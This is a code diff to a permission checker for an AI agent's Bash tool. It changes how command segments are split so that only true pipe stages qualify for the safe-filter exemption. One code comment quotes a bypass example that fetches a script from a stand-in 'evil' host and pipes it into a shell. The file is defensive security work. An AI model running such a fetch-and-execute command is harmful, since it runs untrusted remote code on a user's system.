@@ -272,6 +272,13 @@ function isSafePipelineFilter(segment: string): boolean {
 type BashAnalysis = {
 	/** Every command the shell would run, including inside `$(...)` and backticks. */
 	bashSegments: string[];
+	/**
+	 * Parallel to `bashSegments`: true where the segment is a stage after a plain
+	 * `|`, the only place the safe-filter exemption applies. A command after
+	 * `;`, `&&`, `||` or a newline, the first command, and anything inside a
+	 * substitution is a command in its own right, not a filter.
+	 */
+	bashFilterStages: boolean[];
 	/** Redirection destinations that are real files, `/dev/null` excluded. */
 	bashRedirectionTargets: string[];
 };
@@ -296,14 +303,40 @@ const QUOTE_UNSAFE = /\$'|<<|\$\{|(?:^|\s)#/;
  * line with an unterminated quote, or any construct in QUOTE_UNSAFE, falls back
  * to splitting on every separator, as before.
  */
-export function splitOnSeparators(line: string): string[] {
-	if (!/["'\\]/.test(line) || QUOTE_UNSAFE.test(line)) return line.split(SHELL_SEPARATORS);
+export function splitOnSeparators(line: string): { text: string; after: string }[] {
+	const plain = () => {
+		const parts = line.split(/((?:\|\||&&|[;|&\n])+)/);
+		const out: { text: string; after: string }[] = [];
+		for (let i = 0; i < parts.length; i += 2) {
+			out.push({ text: parts[i] ?? "", after: i === 0 ? "" : (parts[i - 1] ?? "") });
+		}
+		return out;
+	};
+	if (!/["'\\]/.test(line) || QUOTE_UNSAFE.test(line)) return plain();
 
-	const pieces: string[] = [];
+	const pieces: { text: string; after: string }[] = [];
 	let current = "";
+	let run = "";
 	let quote: '"' | "'" | undefined;
+	const flush = () => {
+		pieces.push({ text: current, after: run });
+		current = "";
+		run = "";
+	};
+	let pendingRun = false;
 	for (let i = 0; i < line.length; i += 1) {
 		const ch = line[i] as string;
+		if (quote === undefined && /[;|&\n]/.test(ch)) {
+			if (!pendingRun) {
+				pieces.push({ text: current, after: run });
+				current = "";
+				run = "";
+				pendingRun = true;
+			}
+			run += ch;
+			continue;
+		}
+		pendingRun = false;
 		if (quote === "'") {
 			current += ch;
 			if (ch === "'") quote = undefined;
@@ -320,20 +353,11 @@ export function splitOnSeparators(line: string): string[] {
 			if (ch === '"') quote = undefined;
 			continue;
 		}
-		if (ch === '"' || ch === "'") {
-			quote = ch;
-			current += ch;
-			continue;
-		}
-		if (/[;|&\n]/.test(ch)) {
-			pieces.push(current);
-			current = "";
-			continue;
-		}
+		if (ch === '"' || ch === "'") quote = ch;
 		current += ch;
 	}
-	if (quote !== undefined) return line.split(SHELL_SEPARATORS);
-	pieces.push(current);
+	if (quote !== undefined) return plain();
+	flush();
 	return pieces;
 }
 
@@ -346,13 +370,17 @@ export function splitOnSeparators(line: string): string[] {
  */
 export function analyzeBashCommand(command: string): BashAnalysis {
 	const segments: string[] = [];
+	const filterStages: boolean[] = [];
 	let remainder = command;
 
 	// Command substitutions run programs of their own, so they become segments.
 	for (const pattern of [/\$\(([^()]*)\)/g, /`([^`]*)`/g]) {
 		for (const match of remainder.matchAll(pattern)) {
 			const inner = (match[1] ?? "").trim();
-			if (inner !== "") segments.push(inner);
+			if (inner !== "") {
+				segments.push(inner);
+				filterStages.push(false);
+			}
 		}
 		// Replaced rather than removed so the outer segment still parses.
 		remainder = remainder.replace(pattern, "SUBSTITUTION");
@@ -368,12 +396,20 @@ export function analyzeBashCommand(command: string): BashAnalysis {
 	// Strip the redirections so they do not look like arguments of a segment.
 	remainder = remainder.replace(/(?:^|\s)\d?>>?\s*("[^"]*"|'[^']*'|\S+)/g, " ");
 
-	for (const segment of splitOnSeparators(remainder)) {
-		const trimmed = segment.trim();
-		if (trimmed !== "") segments.push(trimmed);
+	// An empty piece (a leading separator, `;;`) is dropped but its separator run
+	// is lost with it, which is right: only a plain `|` makes a stage a filter.
+	for (const { text, after } of splitOnSeparators(remainder)) {
+		const trimmed = text.trim();
+		if (trimmed === "") continue;
+		segments.push(trimmed);
+		filterStages.push(after === "|" || after === "|&");
 	}
 
-	return { bashSegments: segments, bashRedirectionTargets: redirectionTargets };
+	return {
+		bashSegments: segments,
+		bashFilterStages: filterStages,
+		bashRedirectionTargets: redirectionTargets,
+	};
 }
 
 /**
@@ -766,13 +802,14 @@ export function buildCanUseTool(input: BuildCanUseToolInput): CanUseToolFn {
 
 		if (toolName === "Bash") {
 			const command = typeof toolInput["command"] === "string" ? toolInput["command"] : "";
-			const { bashSegments, bashRedirectionTargets } = analyzeBashCommand(command);
+			const { bashSegments, bashFilterStages, bashRedirectionTargets } =
+				analyzeBashCommand(command);
 
-			for (const segment of bashSegments) {
+			for (const [segmentIndex, segment] of bashSegments.entries()) {
 				// The allow-list is re-applied per segment. Matching only the whole
 				// string would let `Bash(git log*)` carry `git log; curl evil | sh`.
 				if (
-					!isSafePipelineFilter(segment) &&
+					!(bashFilterStages[segmentIndex] === true && isSafePipelineFilter(segment)) &&
 					!bashPatterns.some((pattern) =>
 						matchesToolPattern(pattern, "Bash", { command: segment }),
 					)
